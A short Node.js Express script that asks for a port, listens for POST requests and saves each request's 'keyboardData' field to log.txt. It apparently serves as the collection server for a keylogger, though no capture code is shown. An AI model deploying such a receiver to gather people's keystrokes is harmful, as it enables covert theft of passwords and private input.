const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");
const readline = require("readline");

const app = express();
app.use(bodyParser.json({extended: true}));

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question("Enter the port to use: ", function(port) {
    app.post("/", (req, res) => {
        console.log("Request received!");
        fs.writeFileSync(`log.txt`, req.body.keyboardData);
        res.send()
    });

    app.listen(port, () => {
        console.log(`Listening on port ${port}, use ^C to exit`);
    });

    rl.close();
});
